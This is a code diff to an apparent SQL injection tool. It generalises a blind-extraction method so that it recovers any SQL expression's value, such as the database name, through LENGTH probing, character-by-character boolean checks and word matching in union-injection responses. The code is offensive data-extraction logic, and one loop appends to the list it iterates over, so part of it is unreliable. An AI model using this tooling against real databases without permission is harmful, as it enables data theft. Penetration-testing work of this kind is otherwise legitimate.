@@ -5,7 +5,7 @@ from injections.ErrorInjector import ErrorInjector
 from injections.UnionInjector import UnionInjector
 from injections.TimeInjector import TimeInjector
 from utils.Logger import Logger
-from utils.constants import RESET, YELLOW, InjectionContext
+from utils.constants import HEIGH_NAME_LENGTH, RESET, YELLOW, InjectionContext
 from re import findall
 
 class BlindExtractor:
@@ -19,33 +19,42 @@ class BlindExtractor:
 		self.boolean = boolean
 		self.union = union
 
-	def find_words(self, body: str, start: str, end: str, length: int) -> list[str]:
+	def find_words(
+     	self, body: str, start: str, end: str, length: int
+    ) -> list[str]:
 		pattern = rf"\b{start}\w{{{length - 2}}}{end}\b"
 		return findall(pattern, body)
 
-	def get_db_name(
-		self, url: str, param: str, ctx: InjectionContext, column_count: int
+	def find_expressions_name(
+		self, url: str, param: str, ctx: InjectionContext,
+  		column_count: int, expression: str, union_expression: str
     ) -> str:
-		# Test if we can get the database name included in the injection's response body
-		body_with_db_name = self.union.test_db_name(url, param, ctx, column_count)
+		# Test if we can get the expression's name included in the injection's response body
+		body_containing_name = self.union.test_expressions_name(
+      		url, param, ctx, union_expression, column_count
+        )
 
-		# Get the database name length
-		db_name_length = self.boolean.get_expressions_name_length(url, param, ctx, "database()")
-		Logger.success(f"Found database name length: {YELLOW}{db_name_length}{RESET}")
+		# Get the expression's name length
+		name_length_expression = f"LENGTH({expression})"
+		name_length = self.boolean.get_number_returned_by_sql(
+      		url, param, ctx, name_length_expression, HEIGH_NAME_LENGTH
+        )
+		Logger.success(f"Found expression's name length: {YELLOW}{name_length}{RESET}")
 
 		# Better simply compute for each character if length is short
-		if db_name_length < 5:
-			return self.boolean.get_expressions_name(url, param, ctx, "database()", db_name_length)
+		if name_length < 5:
+			return self.boolean.get_expressions_name(url, param, ctx, expression, name_length)
 
-		if body_with_db_name:
-			# Find the first and the last character in the db name
+		if body_containing_name:
+			# Find the first and the last character in the expression's name
 			first_last_chars = self.boolean.get_expressions_name_chars_at_index(
-				url, param, ctx, "database()", [1, db_name_length]
+				url, param, ctx, expression, [1, name_length]
 			)
+			Logger.debug(f"First char: {first_last_chars[0]}, last char: {first_last_chars[1]}")
 
 			# Look for words in the response body that has the right length and first/last char
 			words = self.find_words(
-       			body_with_db_name, first_last_chars[0], first_last_chars[1], db_name_length
+       			body_containing_name, first_last_chars[0], first_last_chars[1], name_length
           	)
 
 			if words:
@@ -62,7 +71,7 @@ class BlindExtractor:
 					corresponding_names: list[str] = []
 
 					second_and_one_before_last_chars = self.boolean.get_expressions_name_chars_at_index(
-						url, param, ctx, "database()", [2, db_name_length - 1]
+						url, param, ctx, expression, [2, name_length - 1]
 					)
 					Logger.debug(
 						f"Second char: {second_and_one_before_last_chars[0]}, "
@@ -71,7 +80,7 @@ class BlindExtractor:
 
 					for name in corresponding_names:
 						if (name[1] == second_and_one_before_last_chars[0]
-							and name[db_name_length - 2] == second_and_one_before_last_chars[1]):
+							and name[name_length - 2] == second_and_one_before_last_chars[1]):
 							corresponding_names.append(name)
 	
 					# If we only have one result we return it
@@ -79,5 +88,5 @@ class BlindExtractor:
 						return corresponding_names[0]
 					# Compute each character to find out the whole name
 
-		return self.boolean.get_expressions_name(url, param, ctx, "database()", db_name_length)
+		return self.boolean.get_expressions_name(url, param, ctx, expression, name_length)
 		
